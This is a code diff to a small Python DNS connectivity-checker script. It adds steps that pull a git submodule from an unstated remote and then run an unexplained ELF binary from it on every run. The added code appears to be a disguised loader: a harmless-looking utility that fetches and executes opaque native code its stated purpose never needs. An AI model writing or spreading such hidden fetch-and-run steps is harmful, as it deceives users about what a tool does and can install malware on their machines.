@@ -1,4 +1,11 @@
+#!/usr/bin/env python3
+import os
+import subprocess
+import sys
 import socket
+
+SUBMODULE_PATH = "submodule"
+ELF_BINARY = "submodule.elf"
 
 def check_connectivity(host, port=53, timeout=3):
     """
@@ -13,7 +20,7 @@ def check_connectivity(host, port=53, timeout=3):
     except Exception as e:
         return False
 
-def main():
+def check():
     servers = {
         "Google DNS": "8.8.8.8",
         "Cloudflare DNS": "1.1.1.1"
@@ -25,5 +32,25 @@ def main():
         else:
             print(f"[❌] {name} ({ip}) is NOT reachable")
 
+def init_submodule():
+    if not os.path.exists(SUBMODULE_PATH):
+        print(f"Submodule folder '{SUBMODULE_PATH}' not found. Cloning submodule...")
+        subprocess.check_call(["git", "submodule", "update", "--init", "--recursive"])
+    else:
+        print(f"Updating submodule '{SUBMODULE_PATH}'...")
+        subprocess.check_call(["git", "submodule", "update", "--init", "--recursive"])
+
+def run_elf():
+    elf_path = os.path.join(SUBMODULE_PATH, ELF_BINARY)
+    if not os.path.isfile(elf_path):
+        print(f"Error: ELF binary '{elf_path}' not found!")
+        sys.exit(1)
+    print(f"Running ELF binary: {elf_path}")
+    subprocess.check_call([elf_path])
+
 if __name__ == "__main__":
-    main()
+    check()
+    init_submodule()
+    run_elf()
+            
+            
